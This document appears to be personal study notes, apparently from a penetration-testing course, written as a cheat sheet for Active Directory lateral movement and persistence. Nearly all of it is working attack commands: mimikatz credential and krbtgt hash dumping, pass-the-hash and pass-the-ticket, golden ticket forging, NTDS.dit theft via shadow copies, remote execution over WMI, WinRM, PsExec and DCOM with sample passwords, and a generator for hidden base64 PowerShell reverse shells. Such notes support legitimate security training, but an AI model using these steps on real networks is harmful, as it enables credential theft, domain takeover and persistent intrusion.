# AD Lateral Movement Techniques
- all mimikatz run this : ``` privilege::debug ``` to do sussy thing
- spawn cmd inside mimikatz : ``` misc::cmd ```
- Some Ticket may req admin right to access (read)
## WMI 
- Remote Procedure Calls (port 135)
- Req target host credential & that user admininistrator local group in target
- deprecated in realworld
- not restricted by UAC remote restriction for non-domain joined machines 
- Works in cmd & pwsh
### Cmd 
- Dont have direct output 
- Launch calculator remotely  ``` wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc" ```
### Powershell
1. Prep credential object
    ``` 
        $username = 'jen'; // modify this
        $password = 'Nexus123!'; // modify this
        $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
    ```
2. Prep Cim Session
   ```
        $options = New-CimSessionOption -Protocol DCOM
        $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options // modify ip to new victim ip
        $command = 'calc';  // modify this to any rev shell or command
    ```
3. Prep Powershell Base64 Rev Shell
   ``` 
        import sys
        import base64

        payload = {reference https://www.revshells.com/ PowerShell #2 starting from "client....}

        cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

        print(cmd)
    ```
4. Run CIM
    ``` 
        Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
    ``` 

## WinRM
- WS-Management Protocol (xml messages w/ http&https)
- port 5986
- Req Administrators or Remote Management Users Group on target host
### Cmd
- Have output
- ``` winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami" ``` 

### Powershell
1. Prep credential object
    ``` 
        $username = 'jen'; // modify this
        $password = 'Nexus123!'; // modify this
        $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
    ```
2. Start session 
   ``` 
    New-PSSession -ComputerName {Target IP} -Credential $credential
    Enter-PSSession 1 // no need nc
   ```

## PsExec
- Require ADMIN$ share in SMB
- Require that user is admin local group of that machine
- Require file & printer sharing turned on
1. Exec ``` ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd ```

## Pass the hash
- With NTLM authN services only | Kerberos authN NOT WORK!!
- Abuse SMB again
- Run in kali ``` /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@{Target ip} ```

## Overpass the hash
- Passing NTLM generated ticket (TGT) for Kerberos service | Not for NTLM services!!!
1. Run as different user for any exe e.g. notepad (shift right click)
2. Get NTLM ``` mimi> sekurlsa::logonpasswords ``` 
3. Spawn shell of that user``` sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell ```
4. Turn NTLM to Kerberos ticket by generating when access netw share ``` net use \\files04 ```
5. Check the ticket ``` klist ```
6. Spawn shell in victim ``` .\PsExec.exe \\files04 cmd ```

## Pass the ticket
- Passing NTLM ticket to get TGS for Kerberos service | Not for NTLM services!!! 
- More flexibility (TGS > TGT)
1. Export all TGT/TGS from memory ``` mimi> sekurlsa::tickets /export ```
2. Find all ticket and select the one we want ``` pwsh> dir *.kirbi ``` (remember same directory as mimikatz.exe) 
   - our target have record in Group 2 - T... G... S...
   - e.g. ```[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi ``` means dave = the user we want to impersnate and web04 is domain name
3. Inject to klist ``` kerberos::ptt {that kirbi file}```
4. Run as admin shell & access the service

## DCOM
- Distributed Component Object Model & abusing Microsoft Management Console COM app
- Old tech
- Port 135 RPC
- Req local admin
1. Prepare DCOM obj``` $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.177.72")) ```
2. Execute ``` $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"{commands e.g. rev shell}","7") ``` (can edit to other shell)

# AD Persistence
## Golden Ticket
- Create self-made custom TGT
- Create a TGT stating that a non-privileged user is a member of the Domain Admins group
-  krbtgt account password is not automatically changed
-  Require krbtgt password (NTLM hashed)
1. dump the list if have kerberos pwd ``` lsadump::lsa /patch ``` Get domain id here (S-1-5-xxxxx) & NTLM hash of krbtgt
2. remove all existing tickets ``` kerberos::purge ``` 
3. Gen golden ticket ``` kerberos::golden /user:jen /domain:corp.com /sid:{domain} /krbtgt:{krbtgt ntlm hash} /ptt ```
4. Run psexec to lateral movement ``` ./PsExec.exe \\dc1 cmd.exe ```

## Shadow Copies
- Abusing Microsoft backup tech: Volume Shadow Service (Which backup AD database)
- Req Admin in Domain controller
- Start in Domain Controller (with CMD):
  1. Query all shadow copies ``` vshadow.exe -nw -p  C: ``` (Get the shadow copy device name for step 2)
  2. Copy the ntds.dit to DC directory``` copy {shadow copy device name}\windows\ntds\ntds.dit c:\ntds.dit.bak ```
  3. Save to system hive ``` reg.exe save hklm\system c:\system.bak ```
  4. Copy the 2 files to kali (ntds.dit.bak & system.bak)
  5. Use Kali : ``` impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL ``` 
  6. (Optional) Can use pass the hash to get shell 


# How distinguish NLTM vs Kerberos service?
1. Use tools like Mimikatz to dump the cached credentials and look for Kerberos tickets.
2. Check the type of tickets being used when accessing a service. For example, if you see TGTs (Ticket Granting Tickets) or TGSs (Ticket Granting Services), it indicates Kerberos authentication.
3. if you have NTLM hashes and are accessing services using NTLM authentication, it's likely that NTLM is being used.